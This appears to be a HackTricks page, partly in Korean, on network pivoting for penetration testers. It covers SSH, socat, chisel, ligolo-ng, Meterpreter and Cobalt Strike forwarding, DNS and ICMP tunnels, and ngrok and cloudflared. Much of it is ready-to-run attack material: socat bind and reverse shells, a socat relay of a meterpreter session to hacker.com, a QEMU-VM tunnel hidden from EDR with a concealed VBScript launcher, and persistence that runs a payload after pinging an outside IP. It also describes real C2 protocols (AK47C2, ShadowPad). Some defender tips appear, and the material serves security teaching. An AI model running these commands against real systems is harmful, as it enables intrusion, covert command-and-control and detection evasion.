# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> **ICMP** 및 **SYN** 스캔은 socks proxies를 통해 터널링할 수 없으므로, 이 작업을 위해 **disable ping discovery** (`-Pn`)를 사용하고 **TCP scans** (`-sT`)를 지정해야 합니다.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH 그래픽 연결 (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSH Server에 새로운 Port 열기 --> 다른 Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

로컬 포트 --> 침해된 호스트 (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

로컬 포트 --> 침해된 호스트 (SSH) --> 어디로든
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

이는 internal hosts에서 DMZ를 통해 당신의 host로 reverse shells를 가져오는 데 유용합니다:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

새 인터페이스를 생성할 것이므로 **양쪽 장치 모두에 root** 권한이 필요하며, sshd 설정에서 root 로그인을 허용해야 합니다:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
서버 측에서 포워딩 활성화
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
클라이언트 측에 새 라우트를 설정
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **보안 – Terrapin Attack (CVE-2023-48795)**
> 2023년 Terrapin 다운그레이드 공격은 man-in-the-middle이 초기 SSH 핸드셰이크를 변조하여 **any forwarded channel** (`-L`, `-R`, `-D`)에 데이터를 주입할 수 있습니다. SSH 터널에 의존하기 전에 클라이언트와 서버 모두에 패치가 적용되었는지 확인하세요 (**OpenSSH ≥ 9.6/LibreSSH 6.7**) 또는 취약한 `chacha20-poly1305@openssh.com` 및 `*-etm@openssh.com` 알고리즘을 `sshd_config`/`ssh_config`에서 명시적으로 비활성화하세요.

## SSHUTTLE

호스트를 통해 **ssh**로 모든 **traffic**을 특정 **subnetwork**로 **tunnel**할 수 있습니다.\
예: 10.10.10.0/24로 향하는 모든 트래픽을 전달하는 경우
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
개인 키로 연결
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
또 다른 방법:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

teamserver에서 모든 인터페이스에 바인딩해 수신하는 포트를 열어 **beacon을 통해 트래픽을 라우팅할 수 있도록 합니다**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> 이 경우, **port는 beacon host에서 열리며**, Team Server에서는 열리지 않습니다. 트래픽은 Team Server로 전송되고 거기서 지정된 host:port로 전달됩니다
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
참고:

- Beacon's reverse port forward는 **트래픽을 Team Server로 터널링하기 위해 설계되었으며, 개별 머신 간 중계용이 아니다**.
- 트래픽은 **Beacon's C2 traffic 내에서 터널링되며**, P2P 링크도 포함된다.
- 고포트에서 reverse port forwards를 생성하는 데 **관리자 권한은 필요하지 않습니다**.

### rPort2Port local

> [!WARNING]
> 이 경우, **포트는 beacon host에서 열리며**, Team Server가 아니라 **트래픽은 Cobalt Strike client로 전송됩니다** (Team Server로 전송되는 것이 아니다) 그리고 거기서 지정된 host:port로 전달됩니다.
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeOrg)

웹 파일 터널을 업로드해야 합니다: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

다음 링크의 releases 페이지에서 다운로드할 수 있습니다: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
**클라이언트와 서버에 동일한 버전을 사용해야 합니다**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**agent와 proxy는 동일한 버전을 사용하세요**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### 에이전트 바인딩 및 리스닝
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### 에이전트의 로컬 포트 접근
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. 터널은 victim에서 시작된다.\
127.0.0.1:1080에 socks4 proxy가 생성된다.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy**를 통해 피벗하기
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### socks를 통한 Port2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat을 통한 Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
피해자 콘솔에서 마지막 줄 대신 이 줄을 실행하면 **non-authenticated proxy**를 우회할 수 있습니다:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat 터널

**/bin/sh 콘솔**

양측에 인증서를 생성하세요: Client 및 Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

로컬 SSH 포트(22)를 공격자 호스트의 443 포트로 연결합니다
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

콘솔용 PuTTY 버전과 같으며(옵션은 ssh 클라이언트와 매우 유사합니다).

이 바이너리는 피해자 시스템에서 실행되며 ssh 클라이언트이므로, reverse connection을 위해 우리 쪽 ssh 서비스와 포트를 열어야 합니다. 그런 다음 로컬에서만 접근 가능한 포트를 우리 머신의 포트로 포워딩하려면:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

local admin 권한이 필요합니다 (모든 port에 대해)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

시스템에 대한 **RDP 접근 권한**이 필요합니다.  
다운로드:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 이 도구는 Windows의 Remote Desktop Service 기능에서 제공되는 `Dynamic Virtual Channels` (`DVC`)를 사용합니다. DVC는 RDP 연결을 통해 패킷을 **터널링**하는 역할을 합니다.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

클라이언트 컴퓨터에서 **`SocksOverRDP-Plugin.dll`**을 다음과 같이 로드하세요:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
이제 **`mstsc.exe`**를 사용해 **RDP**로 **victim**에 **connect**할 수 있으며, **SocksOverRDP plugin이 활성화되었다는** **prompt**가 표시되고 **127.0.0.1:1080**에서 **listen**할 것입니다.

RDP로 연결하여 victim 머신에 `SocksOverRDP-Server.exe` 바이너리를 업로드하고 실행하세요:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
이제 당신의 머신 (attacker)에서 port 1080이 listening 중인지 확인하세요:
```
netstat -antb | findstr 1080
```
이제 [**Proxifier**](https://www.proxifier.com/)를 사용해 **해당 포트를 통해 트래픽을 프록시할 수 있습니다.**

## Proxify Windows GUI Apps

Windows GUI 앱이 [**Proxifier**](https://www.proxifier.com/)를 통해 프록시를 통해 통신하도록 만들 수 있습니다.\
**Profile -> Proxy Servers**에서 SOCKS 서버의 IP와 포트를 추가하세요.\
**Profile -> Proxification Rules**에서 프록시 처리할 프로그램 이름과 프록시할 IP에 대한 연결 규칙을 추가하세요.

## NTLM proxy bypass

앞에서 언급한 도구: **Rpivot**\
**OpenVPN**도 우회할 수 있으며, 설정 파일에 다음 옵션을 설정하면 됩니다:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

프록시에 대해 인증하고 로컬에 포트를 바인딩하여 지정한 외부 서비스로 포워딩합니다. 그런 다음 이 포트를 통해 원하는 도구를 사용할 수 있습니다.\
예: 포트 443을 포워딩합니다.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Now, if you set for example in the victim the **SSH** service to listen in port 443. You can connect to it through the attacker port 2222.\
You could also use a **meterpreter** that connects to localhost:443 and the attacker is listening in port 2222.

## YARP

Microsoft에서 만든 역방향 프록시입니다. 다음에서 확인할 수 있습니다: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

양쪽 시스템 모두 tun adapters를 생성하고 DNS queries를 이용해 그 사이에 데이터를 터널링하기 위해 루트 권한이 필요합니다.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
터널은 매우 느릴 것입니다. 다음을 사용하여 이 터널을 통해 압축된 SSH 연결을 만들 수 있습니다:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

DNS를 통해 C\&C 채널을 생성합니다. root privileges가 필요하지 않습니다.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell에서**

PowerShell에서 dnscat2 클라이언트를 실행하려면 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)을 사용할 수 있습니다:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat을 사용한 Port forwarding**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains DNS 변경

Proxychains는 `gethostbyname` libc 호출을 가로채서 socks 프록시를 통해 TCP DNS 요청을 터널링합니다. 기본적으로 proxychains가 사용하는 **DNS** 서버는 하드코딩된 **4.2.2.2**입니다. 변경하려면 파일을 편집하세요: _/usr/lib/proxychains3/proxyresolv_ 그리고 IP를 변경합니다. **Windows environment**에 있는 경우 **domain controller**의 IP를 설정할 수 있습니다.

## Go에서의 터널

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 행위자는 외부로 나가는 **DNS** 및 **plain HTTP POST** 트래픽만 악용하는 **dual-channel C2 ("AK47C2")**를 만들어 기업 네트워크에서 거의 차단되지 않는 두 프로토콜을 사용했습니다.

1. **DNS mode (AK47DNS)**
• 무작위 5자 SessionID 생성 (예: `H4T14`).
• *task requests*에는 `1`을, *results*에는 `2`를 앞에 붙이고 여러 필드(플래그, SessionID, 컴퓨터 이름)를 이어 붙입니다.
• 각 필드는 **ASCII 키 `VHBD@H`로 XOR 암호화**되고, 헥스 인코딩되어 점으로 연결되며 — 마지막에 공격자가 제어하는 도메인으로 끝납니다:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• 요청은 **TXT** (대체로 **MG**) 레코드에 대해 `DnsQuery()`를 사용합니다.
• 응답이 0xFF 바이트를 초과하면 백도어는 데이터를 63바이트 조각으로 **분할(fragment)** 하고 마커를 삽입합니다: `s<SessionID>t<TOTAL>p<POS>` — C2 서버가 이를 재조합할 수 있도록 합니다.

2. **HTTP mode (AK47HTTP)**
• JSON 엔벨로프를 빌드합니다:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• 전체 블롭을 XOR-`VHBD@H` → 헥스 → `Content-Type: text/plain` 헤더와 함께 **`POST /`**의 본문으로 전송합니다.
• 응답도 동일한 인코딩을 따르며 `cmd` 필드는 `cmd.exe /c <command> 2>&1`로 실행됩니다.

Blue Team 노트
• 첫 라벨이 긴 헥사(16진수)이고 항상 하나의 희귀 도메인으로 끝나는 비정상적인 **TXT 쿼리**를 찾아보세요.
• 고정된 XOR 키 다음에 ASCII-hex가 오는 패턴은 YARA로 쉽게 탐지할 수 있습니다: `6?56484244?484` (`VHBD@H`의 헥스).
• HTTP의 경우, 순수 헥스이고 바이트 수가 2의 배수인 text/plain POST 본문을 탐지 표시하세요.

{{#note}}
전체 채널은 **표준 RFC 준수 쿼리** 범위에 들어맞으며 각 서브도메인 레이블을 63바이트 미만으로 유지하므로 대부분의 DNS 로그에서 은밀합니다.
{{#endnote}}

## ICMP 터널링

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

두 시스템 모두에서 tun 어댑터를 생성하고 ICMP echo 요청을 사용해 그들 사이에서 데이터를 터널링하려면 Root 권한이 필요합니다.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Download it from here**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **한 줄 명령으로 솔루션을 인터넷에 노출시키는 도구입니다.**\
_노출되는 URI 예시:_ **UID.ngrok.io**

### 설치

- 계정 생성: https://ngrok.com/signup
- 클라이언트 다운로드:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 기본 사용법

**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_필요한 경우 인증 및 TLS를 추가할 수도 있습니다._

#### TCP 터널링
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP를 통한 파일 노출
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_XSS,SSRF,SSTI ...에 유용합니다_\
stdout에서 직접 또는 HTTP interface에서 [http://127.0.0.1:4040](http://127.0.0.1:4000)로 확인할 수 있습니다.

#### Tunneling internal HTTP service
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml 간단한 구성 예제

3개의 터널을 엽니다:

- 2개의 TCP
- 1개의 HTTP — /tmp/httpbin/에서 정적 파일을 노출
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare의 `cloudflared` 데몬은 Cloudflare의 edge를 중계 지점으로 사용하여 인바운드 방화벽 규칙 없이도 **로컬 TCP/UDP 서비스**를 노출하는 아웃바운드 터널을 생성할 수 있습니다. 이는 이그레스 방화벽이 HTTPS 트래픽만 허용하고 인바운드 연결이 차단된 경우 매우 유용합니다.

### 빠른 터널 한 줄 명령
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### DNS를 통한 지속적인 터널
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
커넥터를 시작하세요:
```bash
cloudflared tunnel run mytunnel
```
모든 트래픽이 호스트에서 **포트 443을 통해 아웃바운드**되기 때문에 Cloudflared 터널은 ingress ACLs이나 NAT 경계를 우회하는 간단한 방법입니다. 바이너리가 보통 권한 상승 상태로 실행되는 경우가 많으므로 가능하면 컨테이너나 `--user` 플래그를 사용하세요.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) 는 활발히 유지되는 Go 기반 reverse-proxy로 **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**을 지원합니다. **v0.53.0 (May 2024)**부터는 **SSH Tunnel Gateway**로 동작할 수 있어, 대상 호스트가 추가 바이너리 없이 기본 OpenSSH 클라이언트만으로 리버스 터널을 열 수 있습니다.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 새로운 SSH 게이트웨이 사용하기 (no frpc binary)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
위 명령은 추가 툴을 배포하지 않고 대상의 포트 **8080**을 **attacker_ip:9000**으로 공개합니다 – living-off-the-land pivoting에 이상적입니다.

## QEMU를 이용한 은밀한 VM 기반 터널

QEMU의 user-mode networking (`-netdev user`)은 `hostfwd`라는 옵션을 지원하며 **binds a TCP/UDP port on the *host* and forwards it into the *guest***. 게스트에서 전체 SSH daemon이 실행되면, hostfwd 규칙은 임시로 사용할 수 있는 SSH jump box를 제공하며 이는 완전히 ephemeral VM 내부에 존재합니다 – 모든 악성 활동과 파일이 가상 디스크에 머물러 있기 때문에 EDR로부터 C2 트래픽을 숨기기에 완벽합니다.

### 빠른 한 줄 명령
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 위 명령은 **Tiny Core Linux** 이미지 (`tc.qcow2`)를 RAM에서 실행합니다.
• Windows 호스트의 포트 **2222/tcp**가 게스트 내부의 **22/tcp**로 투명하게 포워딩됩니다.
• 공격자의 관점에서 대상은 단순히 포트 2222만 노출하며, 해당 포트로 도달한 모든 패킷은 VM에서 실행 중인 SSH 서버가 처리합니다.

### VBScript를 통해 은밀하게 실행하기
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Running the script with `cscript.exe //B update.vbs` keeps the window hidden.

### In-guest persistence

Because Tiny Core is stateless, attackers usually:

1. Drop payload to `/opt/123.out`
2. Append to `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.

### Why this evades detection

• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.  
서명되지 않은 실행 파일 2개(`qemu-system-*.exe`)만 디스크에 접근하고, 드라이버나 서비스는 설치되지 않습니다.

• Security products on the host see **benign loopback traffic** (the actual C2 terminates inside the VM).  
호스트의 보안 제품은 **benign loopback traffic**을 관찰합니다(실제 C2는 VM 내부에서 종료됩니다).

• Memory scanners never analyse the malicious process space because it lives in a different OS.  
메모리 스캐너는 악성 프로세스 공간을 분석하지 못합니다. 해당 프로세스는 다른 OS에서 실행되기 때문입니다.

### Defender tips

• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.  
사용자 쓰기 가능 경로에 있는 **unexpected QEMU/VirtualBox/KVM binaries**에 대해 경고를 설정하세요.

• Block outbound connections that originate from `qemu-system*.exe`.  
`qemu-system*.exe`에서 시작되는 아웃바운드 연결을 차단하세요.

• Hunt for rare listening ports (2222, 10022, …) binding immediately after a QEMU launch.  
QEMU 실행 직후 바인딩되는 드문 수신 포트(2222, 10022, …)를 찾아보세요.

## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)

Ink Dragon’s ShadowPad IIS module turns every compromised perimeter web server into a dual-purpose **backdoor + relay** by binding covert URL prefixes directly at the HTTP.sys layer:

* **Config defaults** – if the module’s JSON config omits values, it falls back to believable IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). That way benign traffic is answered by IIS with the correct branding.  
**Config defaults** – 모듈의 JSON 설정에 값이 빠져 있으면 신뢰할 수 있는 IIS 기본값으로 대체됩니다 (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). 이렇게 하면 정상 트래픽에는 IIS가 올바른 브랜딩으로 응답합니다.

* **Wildcard interception** – operators supply a semicolon-separated list of URL prefixes (wildcards in host + path). The module calls `HttpAddUrl` for each entry, so HTTP.sys routes matching requests to the malicious handler *before* the request reaches IIS modules.  
**Wildcard interception** – 운영자는 세미콜론으로 구분된 URL 접두사 목록(호스트+경로의 와일드카드)을 제공합니다. 모듈은 각 항목에 대해 `HttpAddUrl`을 호출하여 HTTP.sys가 일치하는 요청을 IIS 모듈에 도달하기 전에 악성 핸들러로 라우팅합니다.

